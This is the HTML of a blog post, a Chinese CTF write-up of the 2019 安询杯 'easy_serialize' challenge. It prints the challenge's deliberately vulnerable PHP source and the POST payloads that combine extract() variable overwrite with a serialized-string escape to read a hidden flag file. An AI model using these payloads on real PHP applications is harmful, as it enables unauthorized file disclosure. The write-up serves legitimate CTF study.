@@ -1,0 +1,226 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2019安询杯easyseailize - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="1.考点反序列化，变量覆盖，代码审计
+2出发思路这道题目开局就放出来了源码：
+123456789101112131415161718192021222324252627282930313233343,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">2019安询杯easyseailize</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">2019安询杯easyseailize</h1>
+        <div class="stuff">
+            <span>十一月 20, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/BUU/" rel="tag">BUU</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="1-考点"><a href="#1-考点" class="headerlink" title="1.考点"></a>1.考点</h1><p>反序列化，变量覆盖，代码审计</p>
+<h1 id="2出发思路"><a href="#2出发思路" class="headerlink" title="2出发思路"></a>2出发思路</h1><p>这道题目开局就放出来了源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">echo</span> $_SESSION[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看最下面的，让你去phpinfo下面看，其实能找到一个文件：</p>
+<p><img src="image-20201120172012249.png" alt="image-20201120172012249"></p>
+<p>再上下查找，我们还可以看见一个file_get_contents函数，那么我们的目标就很明确</p>
+<ol>
+<li>控制img变量</li>
+<li>向上看，那么就是控制$serialize_info</li>
+<li>继续向上，就是控制$_SESSION</li>
+</ol>
+<p>那我们的目标就很明确了，就是尝试控制$_SESSION的值，进行反序列化的那么一个操作，但是这里我们能控制的参数一个也没有，好在题目给出了一个利用点</p>
+<h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure>
+
+<p>该函数可以允许动态的变量，PHP中使用它的原意是想要令程序员可以程序中动态的调整常量，但是如果允许用户来调用的话就会出现变量覆盖的问题，</p>
+<p>利用方式为我们想要修改的地方，如果是允许用户自定义的修改$_POST的内容，而我们想要修改session当中的值的时候，只需要</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=admin</span><br></pre></td></tr></table></figure>
+
+<p>如果想要修改get当中的参数实际上也是可以的</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET[admin]=123</span><br></pre></td></tr></table></figure>
+
+<p>修改部分代码如下：</p>
+<p><img src="image-20201120173537064.png" alt="image-20201120173537064"></p>
+<p>例子如下：</p>
+<p><img src="image-20201120173027594.png" alt="image-20201120173027594"></p>
+<p>可以看见我们的session为guest，利用extract函数我们就可以进行覆盖了：</p>
+<p><img src="image-20201120173501957.png" alt="image-20201120173501957"></p>
+<h3 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查看这段代码，乍一看好像是对我们想要输出的东西进行了相当严格的过滤，但是它仅仅是将我们输入的值替换为空，而不是die掉程序，结合反序列化的逃逸，我们就可以轻松的输出我们需要的内容</p>
+<p>首先需要明白这道题目到底做了什么，假设我们什么参数也不传入，我们看见的字符串如下：</p>
+<p><img src="image-20201120180809647.png" alt="image-20201120180809647"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正常来说，我们是不可以控制这里面的值的，但是通过变量覆盖我们就可以控制其中的值了，但是又恰恰因为是变量覆盖的原因，我们如果单纯的写入function会因为前面已经有function了而无法写入，此时我们需要做的就是把前面的东西吃掉自己写入！这样就可以了！！！！！！！！！！！</p>
+<p>而我们可以控制的user当中的guest，此时我们需要吃掉的字符串键位</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;gura&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflagflag&amp;_SESSION[function]=1bbbb&quot;;s:8:&quot;function&quot;;s:5:&quot;ysllz&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读到了文件，成功，</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">1.考点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E5%87%BA%E5%8F%91%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">2出发思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">利用点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extract"><span class="toc-number">2.1.1.</span> <span class="toc-text">extract</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8"><span class="toc-number">2.1.2.</span> <span class="toc-text">反序列化逃逸</span></a></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
